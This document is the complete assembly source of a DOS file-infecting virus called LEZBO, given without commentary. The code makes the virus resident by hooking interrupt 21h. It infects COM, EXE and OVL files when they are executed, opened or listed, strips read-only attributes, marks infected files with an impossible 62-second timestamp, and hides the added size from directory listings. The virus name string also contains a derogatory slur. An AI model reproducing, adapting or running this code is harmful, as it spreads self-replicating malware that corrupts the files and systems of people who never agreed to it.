        .model   tiny
         P386N                               ;386 non-protected mode
        .code

         org     0                       ;Do NOT compile as a .COM file
                                                                           
Lezbo:
         mov     bx,offset Delta_Ofs    ;Offset is altered during infect
         add     bx,offset first_4 - offset Delta_Ofs

Delta_Ofs:
         sub     bx,offset first_4      ;bx = delta offset

         dec     ax                     ;ax=0FFFFh -> installation check
         int     21h
         or      al,ah                  ;are al and ah the same?
         je      short exit_virus       ;if yes, assume we are installed

         push    ds
         xor     di,di
         mov     ds,di                  ;beginning of INT table segment
         mov     eax,ds:21h*4                     ;get INT 21h vector
         mov     dword ptr cs:int21_vec[bx],eax   ;store it

         mov     cx,es                     ;es=PSP segment
         dec     cx                     ;sub 1 to get MCB
         mov     ds,cx                  ;ds=MCB
         sub     word ptr [di+3],80h
         mov     ax,word ptr [di+12h]   ;get high memory segment
         sub     ax,080h                ;give us room
         mov     word ptr [di+12h],ax   ;save it
         mov     es,ax                  ;top of memory
         sub     ax,1000h               ;reserve it for us
         mov     word ptr cs:XAX[bx],ax  ;save for in INT 21h handler

         push    cs
         pop     ds                     ;ds=cs

         mov     si,bx                  ;point to beginning of virus
         mov     cx,offset first_4      ;bytes to move
         cld                            ;inc si,di
         repz    movsb                  ;copy virus to top of memory
         mov     ds,cx                  ;ds=0

         cli                                   ;turn interrupts off
         mov     word ptr ds:[21h*4],offset New_21 ;point to new ofs
         mov     word ptr ds:[21h*4]+2,es           ;point to new seg
         sti                                   ;turn interrupts back on

         pop     ds
         push    ds
         pop     es
                                                                           
exit_virus:
         lea     si,word ptr first_4[bx]  ;point to stored 1st 4 bytes
         mov     di,100h                  ;di=beginning of host
         cmp     bx,di                    ;host starts at 0100h?
         jb      short exit_EXE           ;if not, exit for EXE
         push    di                       ;push 100h on stack for RET
         movsd                            ;restore first 4 bytes in host
         ret                              ;execute host file as expected
                                                                           
exit_EXE:
         mov     ax,es                    ;ax=PSP segment
         add     ax,10h
         add     word ptr cs:[si+2],ax    ;reallocate host entry
         add     word ptr cs:[si+4],ax
         cli                              ;turn interrupts off
         mov     sp,word ptr cs:[si+6]    ;restore stack ptr
         mov     ss,word ptr cs:[si+4]    ;restore stack seg
         sti                              ;turn interrupts back on
         jmp     dword ptr cs:[si]        ;execute host file as expected

;--- Virus INT 21h Handler --------------------------------

install_check:
         inc     ax                       ;AX=0 if install check
         iret                             ;and RET

New_21:
         cmp     ax,0FFFFh              ;installation check?
         je      short install_check    ;respond to installation check
         cmp     ah,4Bh                 ;execute program?
         je      short exec_prog        ;attempt infection, then execute
         cmp     ah,11h                 ;find first?
         je      short find_file        ;find, then attempt infection
         cmp     ah,12h                 ;find next?
         je      short find_file        ;find, then attempt infection
         cmp     ax,3D00h               ;open a file?
         jne     short call_DOS         ;otherwise, let DOS process INT
         call    infect_file            ;attempt to infect opened file

call_DOS:
           db     0EAh                  ;JMP to
int21_vec  dd     'SKSK'                ; original INT 21h

find_file:
         push    bp
         mov     bp,sp                  ;look on stack
         cmp     word ptr [bp+4],'SK'   ;Is it Lezbo searching?
XAX      equ     $-2
         pop     bp
         jb      short call_DOS       ;let DOS handle if Lezbo searches
         call    Int_21h                     ;if not Lezbo, continue virus
         push    ax
         push    bx
         push    dx
         push    es
         mov     ah,2Fh                 ;get DTA
         call    Int_21h
         cmp     byte ptr es:[bx],0FFh  ;is this an extended FCB?
         je      short Not_Extended_FCB ;jump if it's not, otherwise
         sub     bx,7                   ;convert to normal FCB

Not_Extended_FCB:
         mov     al,byte ptr es:[bx+1Eh]  ;minutes of last write 
         and     al,1Fh                   ;mask out seconds
        cmp     al,1Fh                   ;62 seconds?
         jne     short exit_find          ;exit, it's infected

         mov     eax,dword ptr es:[bx+24h] ;get file size
         sub     eax,offset virus_end
         jl      short exit_find           ;something's wrong.. jump out
         mov     dword ptr es:[bx+24h],eax  ;store new size

exit_find:
         pop     es
         pop     dx
         pop     bx
         pop     ax
         iret                           ;return to caller

exec_prog:
         call    infect_it              ;infect whatever it is...
         jmp     short call_DOS         ; and do real interrupt

infect_file:
         push    si                     ;save registers
         push    di
         push    ds
         push    es
         push    cx
         push    ax
         mov     si,dx                  ;si=victim's name

extension:
         lodsb                          ;scan filename for extension
         or      al,al                  ;look at al
         jz      short no_ext
         cmp     al, '.'
         jne     short extension
         mov     di,offset ext_table-3  ;look at extension table
         push    cs
         pop     es                     ;es=cs
         mov     cx,3                   ;next extension in table
next_ext:
         push    cx                     ;present extension in table
         push    si
         mov     cx,3
         add     di,cx                  ;point to next ext in table
         push    di

look_ext:
         lodsb                          ;get first byte of extension
         and     al,5Fh
         cmp     al,byte ptr es:[di]    ;same?
         jne     short wrong_ext        ;wrong extension. try another
         inc     di                     ;next char in extension
         loop    look_ext               ;get it

         call    infect_it
         add     sp,6
         jmp     short no_ext

wrong_ext:
         pop     di
         pop     si
         pop     cx
         loop    next_ext               ;try next extension

no_ext:
         pop     ax
         pop     cx
         pop     es
         pop     ds
         pop     di
         pop     si
         ret
                                                                           
infect_it:
         pushf
         push    ax
         push    bx
         push    cx
         push    si
         push    di
         push    es
         push    ds
         push    dx
         mov     ax,4300h             ;get file attributes
         call    Int_21h
         jb      short cant_inf
         push    cx                     ;store attribs on stack
         and     cl,1                   ;mask read only bit
         cmp     cl,1                   ;read only file?
         pop     cx                     ;get attrib info again
         jne     short open_4_write     ;continue if not read-only
         and     cl,0FEh                ;otherwise, enable write
         mov     ax,4301h
         call    Int_21h

open_4_write:
         mov     ax,3D02h               ;open file for r/w
         call    Int_21h
         jnb     short process_timestamp

cant_inf:
         jmp  cant_infect

process_timestamp:
         xchg    ax,bx                  ;put file handler into bx
         push    cs
         push    cs
         pop     ds
         pop     es                     ;es=ds=cs
         mov     ax,5700h               ;get file Date and Time
         call    Int_21h
         push    dx                     ;save date
         push    cx                     ;save time
         and     cl,1Fh                 ;mask out seconds
         cmp     cl,1Fh                 ;is time at 62 seconds?
         je      short inf_error        ;jump if it is
         mov     dx,offset data_buf     ;buffer for data
         mov     cx,offset Buffer_End-offset data_buf
         mov     ah,3Fh                 ;read from file
         call    Int_21h                ;bx=file handle
         jnb     short read_ok

inf_error:
         stc                            ;set carry for error
         jmp    inf_close

read_ok:
         cmp     ax,cx                  ;read in 1Ch bytes?
         jne     short inf_error        ;exit if error reading
         xor     dx,dx                  ;zero dx
         mov     cx,dx                  ;ofs 0<orig of new file pos
         mov     ax,4202h               ;set pointer to end of file
         call    Int_21h

file_type:
         cmp     word ptr Disk_ID,'ZM'  ;EXE header?
         je      short EXE_header       ;jump if yes, COM if no...
                                                                           
         cmp     byte ptr Disk_ID+3,'O' ;is 4th byte from begin a 'O'?
         je      short inf_error        ;get out if it is

COM_start:
         mov     si,offset Disk_ID      ;si=beginning of victim
         mov     di,offset first_4      ;di=our storage space
         movsd                          ;store 1st bytes in our place
         sub     ax,3                   ;sub 3 for jmp statement
         mov     byte ptr Disk_ID,0E9h  ;add the jmp statement
         mov     word ptr Disk_ID+1,ax  ;add the destination
         mov     byte ptr Disk_ID+3,'O' ;add the marker
         add     ax, (offset Delta_Ofs)+0103H
         jmp     short cont_inf

EXE_header:
         cmp     word ptr Stack_SP,offset Virus_End+512  ;infected?
         je      short inf_error                  ;if so, exit
         cmp     word ptr Overlays,0         ;is it an overlay?
         jne     short inf_error             ;if not main prog, leave
         push    dx
         push    ax
         mov     cl,4
         ror     dx,cl
         shr     ax,cl                  ;convert to paragraphs
         add     ax,dx                  ;ax:dx=filesize
         sub     ax,word ptr Header_Size ;subtract header size
         mov     si,offset Start_IP
         mov     di,offset first_4      ;original CS:IP
         movsd
         mov     si,offset stack_ss     ;save stack
         movsd                          ;ax:dx=filesize
         mov     word ptr start_cs,ax   ;set init CS
         mov     word ptr stack_ss,ax   ;and stack
         mov     word ptr stack_sp,offset Virus_End+512 ;vir+stack size

         pop     ax
         pop     dx
         push    ax
         add     ax, offset Virus_End+512  ;virus + stack size
         jnb     short no_carry
         inc     dx

no_carry:
         mov     cx,512                 ;take image size
         div     cx
         mov     word ptr File_Size,ax  ;image size /512
         mov     word ptr Last_Page,dx  ;imaze size MOD 512

         pop     ax
         and     ax,0Fh
         mov     word ptr Start_IP,ax   ;set initial ip
         add     ax,(offset Delta_Ofs)

cont_inf:
         mov     word ptr ds:Lezbo+1,ax ;Store relative offset
         push    ds                     ;
         xor     si,si
         mov     ds,si

         pop     ds
         push    bx

         mov     di,offset Buffer_End
         mov     cx,offset Virus_End
         push    cx

         cld
         repz    movsb

         mov     dx,offset Buffer_End
         pop     cx
         pop     bx
         mov     ah,40h                 ;write virus code to victim
         call    Int_21h
         jc      short inf_close
         xor     dx,dx
         mov     cx,dx
         mov     ax,4200h               ;set ptr loc
         call    Int_21h
         jb      short inf_close
         mov     dx,offset data_buf
         mov     cx,offset Buffer_End-offset data_buf
         mov     ah,40h                 ;write new header to victim
         call    Int_21h

inf_close:
         pop     cx
         pop     dx
         jb      short close_file
         or      cl,1Fh                 ;set timestamp to 62 secs

close_file:
         mov     ax,5701h               ;set file date and time
         call    Int_21h
         mov     ah,3eh
         call    Int_21h

cant_infect:
         pop     dx
         pop     ds
         pop     es
         pop     di
         pop     si
         pop     cx
         pop     bx
         pop     ax
         popf
         ret
                                                                           
Int_21h:
         pushf
         call     dword ptr cs:int21_vec  ;call real INT 21h
         ret

virname       db    ' -[LEZBO]- The Whore of Babylon '

ext_table     db    'COMEXEOVL'

first_4       dw    0,0FFF0h

origstack     dw    0,0FFFFh
                                                                           

Virus_End:

data_buf:
Disk_ID       dw    ?
Last_Page     dw    ?
File_Size     dw    ?
Relocs        dw    ? ;;
Header_Size   dw    ?
Min_Alloc     dw    ? ;;
Max_Alloc     dw    ? ;;
Stack_SS      dw    ? ;;
Stack_SP      dw    ?
CheckSum      dw    ?
Start_IP      dw    ?
Start_CS      dw    ? ;;
Reloc_Ofs     dw    ? ;;
Overlays      dw    ?
Buffer_End:

        End   Lezbo
